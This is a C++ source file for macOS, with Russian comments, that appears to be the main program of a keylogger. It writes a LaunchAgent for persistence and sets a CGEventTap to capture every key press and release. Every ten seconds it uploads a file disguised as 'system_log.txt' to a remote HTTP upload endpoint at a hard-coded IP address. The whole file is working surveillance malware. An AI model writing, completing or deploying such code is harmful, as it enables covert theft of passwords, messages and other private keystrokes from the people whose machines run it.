#include <CoreFoundation/CoreFoundation.h>
#include <chrono>
#include <iostream>
#include <string>
#include <thread>
#include <unistd.h>
#include "file_reader.h"
#include "event_listener.h"
#include "file_uploader.h"

char resolved_path[PATH_MAX];

void DelayedCallback(CFRunLoopTimerRef timer, void *info) {
    // TODO: change !!!
    const std::string url = "http://10.96.183.71:3000/upload";
    const std::string filePath =  static_cast<std::string>(resolved_path) + "/system_log.txt";

    CheckAndSendFile(url, filePath);
}

int main(int argc, char *argv[]) {
    if (argc < 1) {
        std::cerr << "Не удалось получить путь к программе." << std::endl;
        return 1;
    }
        
    if (realpath(argv[0], resolved_path) == nullptr) {
        std::cerr << "Не удалось разрешить путь к программе." << std::endl;
        return 1;
    }

    // Извлечение пути к директории
    char *last_slash = strrchr(resolved_path, '/');
    if (last_slash != nullptr) {
        // Обрезаем имя программы, оставляя только путь к директории
        *last_slash = '\0'; 
    }

    CreateLaunchAgentFile(resolved_path);

    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, 
        kCGHeadInsertEventTap, 
        kCGEventTapOptionDefault, 
        CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp), 
        eventCallback,
        nullptr
    );

    if (!eventTap) {
        const char* errorMessage = "Не удалось создать Tap событий.";
        std::cerr << errorMessage << std::endl;
        return 1;
    }

    // Создаем таймер, который будет вызывать функцию DelayedCallback каждые 10 секунд
    CFRunLoopTimerContext context = {0, NULL, NULL, NULL, NULL};
    // TODO: change !!!
    CFTimeInterval interval = 10.0;
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(NULL, CFAbsoluteTimeGetCurrent() + interval, interval, 0, 0, DelayedCallback, &context);

    // Добавляем таймер в текущий run loop
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopCommonModes);

    // Получаем run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Начинаем слушать события
    CGEventTapEnable(eventTap, true);

    // Запускаем run loop
    CFRunLoopRun();

    return 0;
}
